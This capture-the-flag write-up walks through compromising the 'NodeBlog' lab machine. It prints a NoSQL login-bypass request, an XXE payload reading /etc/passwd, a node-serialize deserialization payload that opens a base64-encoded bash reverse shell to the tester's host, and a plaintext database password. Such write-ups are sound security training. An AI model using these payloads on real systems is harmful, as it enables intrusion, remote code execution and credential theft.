---
description: H
---

# NodeBlog

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.96.160
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 07:30 EST
Nmap scan report for 10.129.96.160
Host is up (0.013s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

### NoSQL Login Bypass

This was a UHC qualifier box in 2021.

<figure><img src="../../../.gitbook/assets/image (1705).png" alt=""><figcaption></figcaption></figure>

There was a login functionality there. I tested some SQL Injection but to no avail. Because this was a UHC box, this was probably the way in. I tested some NoSQL injection and it worked in bypassing it!

```http
POST /login HTTP/1.1
Host: 10.129.96.160:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 56
Origin: http://10.129.96.160:5000
Connection: close
Referer: http://10.129.96.160:5000/login
Upgrade-Insecure-Requests: 1

{
"user": "admin",
"password": {"$ne": "admin"}

}
```

<figure><img src="../../../.gitbook/assets/image (3343).png" alt=""><figcaption></figcaption></figure>

### XXE Injection

All of the functions do nothing much, except for the Upload one. When trying to upload something, I get this error:

```
Invalid XML Example: Example DescriptionExample Markdown
```

This indidates that we have to upload a malicious XML file to achieve XXE injection for our reverse shell. Taking a look at the POST request in Burpsuite reveals that we need this format:

<figure><img src="../../../.gitbook/assets/image (2936).png" alt=""><figcaption></figcaption></figure>

I headed to PayloadAllTheThings to try some XXE injection payloads, and it worked rather well:

```markup
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<post>
        <title>mypost</title>
        <description>testfile</description>
        <markdown>&file;</markdown>
</post>
```

Then we can save this into a file and upload it. The output would be printed in the `markdown` area:

<figure><img src="../../../.gitbook/assets/image (2557).png" alt=""><figcaption></figcaption></figure>

Earlier while testing my NoSQL injections, I did run across an error like this:

<figure><img src="../../../.gitbook/assets/image (1191).png" alt=""><figcaption></figcaption></figure>

So the source code files are in `/opt/blog`. A bit more testing revealed the main file to be `server.js`.

```javascript
const express = require(&#39;express&#39;)
const mongoose = require(&#39;mongoose&#39;)
const Article = require(&#39;./models/article&#39;)
const articleRouter = require(&#39;./routes/articles&#39;)
const loginRouter = require(&#39;./routes/login&#39;)
const serialize = require(&#39;node-serialize&#39;)
const methodOverride = require(&#39;method-override&#39;)
const fileUpload = require(&#39;express-fileupload&#39;)
const cookieParser = require(&#39;cookie-parser&#39;);
const crypto = require(&#39;crypto&#39;)
const cookie_secret = &#34;UHC-SecretCookie&#34;
//var session = require(&#39;express-session&#39;);
const app = express()

mongoose.connect(&#39;mongodb://localhost/blog&#39;)

app.set(&#39;view engine&#39;, &#39;ejs&#39;)
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride(&#39;_method&#39;))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: &#34;UHC-SecretKey-123&#34;}));

function authenticated(c) {
    if (typeof c == &#39;undefined&#39;)
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash(&#39;md5&#39;).update(cookie_secret + c.user).digest(&#39;hex&#39;)) ){
        return true
    } else {
        return false
    }
}


app.get(&#39;/&#39;, async (req, res) =&gt; {
    const articles = await Article.find().sort({
        createdAt: &#39;desc&#39;
    })
    res.render(&#39;articles/index&#39;, { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
})

app.use(&#39;/articles&#39;, articleRouter)
app.use(&#39;/login&#39;, loginRouter)


app.listen(5000)
```

First thing I notice is that **there is unserialisation going on**. This web application must be vulnerable to RCE through Deserialisation. This article showed up when I searched for this exploit:

{% embed url="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" %}

I tested the token given there and it worked: (after URL encoding)

```
%7B%22rce%22%3A%22_%24%24ND_FUNC%24%24_function%28%29%7Brequire%28%27child_process%27%29.exec%28%27ping%20-c%201%2010.10.14.39%27%2C%20function%28error%2C%20stdout%2C%20stderr%29%7Bconsole.log%28stdout%29%7D%29%3B%7D%28%29%22%7D%0A
```

Now, we can replace the `ping` command I used above with a reverse shell:

```bash
%7B%22rce%22%3A%22_%24%24ND_FUNC%24%24_function%28%29%7Brequire%28%27child_process%27%29.exec%28%27echo%20%5C%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4zOS84ODg4IDA%2BJjEK%5C%22%20%7C%20base64%20-d%20%7C%20bash%27%2C%20function%28error%2C%20stdout%2C%20stderr%29%7Bconsole.log%28stdout%29%7D%29%3B%7D%28%29%22%7D%0A
```

This uses base64 to encode the shell one-liner and connect to port 8888.

<figure><img src="../../../.gitbook/assets/image (2932).png" alt=""><figcaption></figcaption></figure>

When trying to read the user flag, I found out that we did not have access to our own home directory. This was because of the permissions set:

```
admin@nodeblog:/home$ ls -la
ls -la
total 16
drwxr-xr-x 1 root  root   10 Dec 27  2021 .
drwxr-xr-x 1 root  root  180 Dec 27  2021 ..
drw-r--r-- 1 admin admin 220 Jan  3  2022 admin
```

We can correct this with `chmod 777 admin`.

## Privilege Escalation

I ran a LinPEAS scan on this machine and found the `mongoDB` credentials file.

```
mongodb      802  0.3  1.8 981772 76124 ?        Ssl  16:38   0:08 /usr/bin/mongod --unixSocketPrefix=/run/mongodb --config /etc/mongodb.conf
```

Earlier we used NoSQL injection to access this, and perhaps we can find the actual credentials for the `admin` user (so that I can check `sudo` privleges). Some DBs and collections can be found here.

<figure><img src="../../../.gitbook/assets/image (945).png" alt=""><figcaption></figcaption></figure>

I could find a password from the users collections.

{% code overflow="wrap" %}
```
>  db.users.find()
{ "_id" : ObjectId("61b7380ae5814df6030d2373"), "createdAt" : ISODate("2021-12-13T12:09:46.009Z"), "username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }
```
{% endcode %}

We can use this to check `sudo` privileges and find an easy root path:

<figure><img src="../../../.gitbook/assets/image (2687).png" alt=""><figcaption></figcaption></figure>
